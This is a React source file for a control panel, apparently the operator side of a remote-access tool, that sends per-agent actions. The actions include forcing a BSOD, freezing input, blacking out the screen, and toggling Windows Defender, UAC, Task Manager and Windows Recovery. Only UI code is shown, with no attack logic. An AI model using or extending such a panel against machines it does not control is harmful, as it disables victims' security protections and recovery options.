import { M, MHI, KEY_HI, MT, MM, MONO } from "./constants";
import Section from "./Section";
import Key from "./Key";
import LedRow from "./LedRow";

export default function ControlPanel({ agent, status, action, onHide }) {
  return (
    <div style={{
      width: 200, flexShrink: 0,
      background: M,
      backgroundImage: "repeating-linear-gradient(180deg, transparent 0px, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 3px)",
      borderLeft: `1px solid ${MHI}`,
      boxShadow: `inset 1px 0 0 ${KEY_HI}`,
      display: "flex", flexDirection: "column",
      padding: "10px 10px",
      gap: 10,
      overflowY: "auto",
    }} className="vista-scroll">
      <div style={{ paddingBottom: 6, borderBottom: `1px solid ${MHI}`, display: "flex", alignItems: "center" }}>
        <div style={{ fontFamily: MONO, fontSize: 10, color: MM, letterSpacing: "0.06em", textTransform: "uppercase", fontWeight: 600, flex: 1 }}>
          {agent.name || agent.id}
        </div>
        <button
          onClick={onHide}
          title="Hide controls"
          style={{
            background: "transparent", border: "none", cursor: "pointer",
            color: MM, fontFamily: MONO, fontSize: 11, padding: "0 2px",
            lineHeight: 1, transition: "color 0.15s",
          }}
          onMouseEnter={e => e.currentTarget.style.color = MT}
          onMouseLeave={e => e.currentTarget.style.color = MM}
        >
          ▶
        </button>
      </div>

      <Section label="Power">
        <div style={{ display: "flex", gap: 6, paddingTop: 2 }}>
          <Key label="Lock" onClick={() => action("lock_pc")} />
          <Key label="Restart" onClick={() => action("restart_pc")} />
        </div>
        <div style={{ marginTop: 6 }}>
          <Key label="Shut Down" danger onClick={() => action("shutdown_pc")} />
        </div>
        <div style={{ marginTop: 6 }}>
          <Key label="BSOD" danger onClick={() => action("bsod")} />
        </div>
      </Section>

      <Section label="Input">
        <LedRow label="Freeze Mouse" active={!!status.mouse} onClick={() => action("mouse")} />
        <LedRow label="Blackout" active={!!status.blackout} onClick={() => action("blackout")} />
      </Section>

      <Section label="Security">
        <LedRow label="Defender" active={!!status.defender} onClick={() => action("defender")} />
        <LedRow label="UAC" active={!!status.uac} onClick={() => action("uac")} />
        <LedRow label="Task Manager" active={!!status.taskmgr} onClick={() => action("taskmgr")} />
        <LedRow label="Windows RE" active={!!status.reagentc} onClick={() => action("reagentc")} />
      </Section>
    </div>
  );
}